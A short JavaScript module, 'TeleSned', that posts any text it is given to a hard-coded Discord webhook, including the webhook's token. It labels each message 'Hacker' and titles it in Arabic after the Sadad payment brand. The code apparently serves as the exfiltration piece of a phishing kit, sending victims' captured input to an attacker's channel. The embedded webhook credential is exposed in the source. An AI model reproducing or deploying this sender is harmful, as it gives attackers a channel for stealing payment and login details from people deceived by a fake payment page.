import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1318990970519294004/Hzl6uJu85D2gLpdtbFMp-EheGuoJAdQRKR9WA85g41JoQM1umjxCikAFoivixRjADhJ5",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
